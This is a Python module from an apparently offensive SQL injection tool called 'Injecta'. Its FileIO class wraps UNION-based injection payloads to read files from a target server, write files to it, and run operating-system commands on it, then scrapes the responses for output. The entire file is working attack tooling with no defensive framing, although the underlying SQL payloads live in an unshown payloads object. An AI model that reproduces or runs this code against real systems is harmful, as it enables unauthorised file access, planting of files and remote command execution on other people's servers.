"""
Injecta — File read/write & OS command execution
"""
from typing import Any, Dict, List, Optional


class FileIO:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info

    def read_file(self, url: str, param: str, path: str) -> List[str]:
        self.log.info(f"Reading file: {path}")
        queries = self.payloads.file_read(path) if hasattr(self.payloads, 'file_read') else []
        if not queries:
            self.log.warn(f"File read not supported for {getattr(self.payloads, 'name', 'unknown')}")
            return []

        for q in queries:
            results = self._try_extract(url, param, q)
            if results:
                self.log.ok(f"Read {len(results)} line(s) from {path}")
                return results
        return []

    def write_file(self, url: str, param: str, path: str, content: str) -> bool:
        self.log.info(f"Writing to file: {path}")
        queries = self.payloads.file_write(path, content) if hasattr(self.payloads, 'file_write') else []
        if not queries:
            self.log.warn(f"File write not supported for {getattr(self.payloads, 'name', 'unknown')}")
            return False

        for q in queries:
            success = self._try_write(url, param, q)
            if success:
                self.log.ok(f"Written to {path}")
                return True
        return False

    def os_cmd(self, url: str, param: str, cmd: str) -> List[str]:
        self.log.info(f"Executing OS command: {cmd}")
        queries = self.payloads.os_cmd(cmd) if hasattr(self.payloads, 'os_cmd') else []
        if not queries:
            self.log.warn(f"OS command not supported for {getattr(self.payloads, 'name', 'unknown')}")
            return []

        for q in queries:
            results = self._try_extract(url, param, q)
            if results:
                self.log.ok(f"Command output ({len(results)} lines)")
                return results
        return []

    def _try_extract(self, url: str, param: str, sql: str) -> List[str]:
        payload = f"' UNION {sql}-- -"
        _, resp_text, _ = self.req.test_raw(url, payload, param)
        if resp_text and len(resp_text) > 50:
            import re
            candidates = re.findall(r'([\w/\-.,:;@#$%^&*()\[\]{}<>?\\|~`\'\"! ]+)', resp_text)
            if candidates:
                return [c.strip() for c in candidates if len(c.strip()) > 1][:50]
        return []

    def _try_write(self, url: str, param: str, sql: str) -> bool:
        payload = f"' UNION {sql}-- -"
        _, resp_text, err = self.req.test_raw(url, payload, param)
        if err:
            self.log.debug2(f"Write failed: {err}")
            return False
        if resp_text and "error" in resp_text.lower():
            self.log.debug2(f"Write may have failed: {resp_text[:200]}")
            return False
        return True
